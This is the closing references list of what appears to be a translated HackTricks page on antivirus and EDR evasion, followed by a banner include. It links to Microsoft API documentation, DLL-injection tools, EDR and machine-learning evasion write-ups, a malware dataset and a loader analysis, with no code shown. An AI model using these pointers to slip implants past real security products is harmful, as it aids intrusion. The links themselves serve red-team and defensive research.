- [41] [Izvorni kod InjectSetConsole za TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcija CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kreiranje child procesa sa preusmerenim ulazom i izlazom](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Preoblikovanje C# alata pomoću WasmForge-a](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kompiliranje C# / .NET projekata](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty dokaz koncepta i izvorni kod](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Zloupotreba internih mehanizama thread pool-a za DLL injection bez shellcode-a](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Skup podataka za testiranje EMBER2024 i alati thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Korišćenje EMBER2024 za procenu red team implantata](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Izbegavanje detekcija zasnovanih na machine learning-u](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader, .NET framework za učitavanje zasnovan na XAML-u](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Enumeracija AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Metoda IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
